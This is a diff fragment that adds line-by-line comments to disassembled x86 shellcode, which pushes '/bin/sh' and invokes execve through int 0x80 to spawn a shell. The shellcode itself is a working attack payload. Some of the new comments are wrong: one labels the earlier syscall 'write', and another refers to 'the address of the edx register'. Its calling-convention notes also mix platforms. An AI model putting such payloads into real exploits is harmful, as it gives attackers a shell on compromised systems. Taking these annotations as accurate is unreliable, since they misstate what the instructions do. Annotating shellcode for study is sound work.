@@ -47,15 +47,15 @@ d:  b8 1f 00 00 00          mov    eax,0x1f   ;Move the value 31 into the eax re
 67: cd 80                   int    0x80       ;This line performs a software interrupt (int) with the value 0x80 write systemcall
 69: 68 2f 73 68 00          push   0x68732f   ;This line pushes the constant value 0x68732f onto the stack
 6e: 68 2f 62 69 6e          push   0x6e69622f ;This line pushes the constant value 0x6e69622f onto the stack. These two constants are ASCII codes for the string "/bin/sh"
-73: 89 e2                   mov    edx,esp
-75: 31 c0                   xor    eax,eax
-77: 50                      push   eax
-78: 52                      push   edx
-79: 89 e1                   mov    ecx,esp
-7b: 50                      push   eax
-7c: 51                      push   ecx
-7d: 52                      push   edx
-7e: 50                      push   eax
-7f: b8 3b 00 00 00          mov    eax,0x3b
-84: cd 80                   int    0x80
-86: cc                      int3
+73: 89 e2                   mov    edx,esp    ;This instruction moves the address of the top of the stack (esp) into the edx register
+75: 31 c0                   xor    eax,eax    ;This instruction performs an exclusive OR (XOR) operation between the eax register and itself, effectively setting eax to 0
+77: 50                      push   eax        ;This instruction pushes the value of eax (which is now 0) onto the stack
+78: 52                      push   edx        ;This instruction pushes the value of edx (which holds the address of the top of the stack) onto the stack
+79: 89 e1                   mov    ecx,esp    ;This instruction moves the address of the top of the stack (now the address of the edx register) into the ecx register
+7b: 50                      push   eax        ;This instruction pushes the value of eax (0) onto the stack
+7c: 51                      push   ecx        ;This instruction pushes the value of ecx (the address of the top of the stack) onto the stack
+7d: 52                      push   edx        ;This instruction pushes the value of edx (the address of the top of the stack) onto the stack
+7e: 50                      push   eax        ;This instruction pushes the value of eax (0) onto the stack
+7f: b8 3b 00 00 00          mov    eax,0x3b   ;This instruction moves the value 0x3b (59 in decimal) into the eax register, which represents the system call for "execve"
+84: cd 80                   int    0x80       ;This instruction generates a software interrupt (int) to transfer control to the kernel. The interrupt number 0x80 is used to invoke a system call
+86: cc                      int3              ;This instruction is the interrupt 3 (int3) instruction, which is used for debugging purposes. This causes the program to stop and allows a debugger to take control
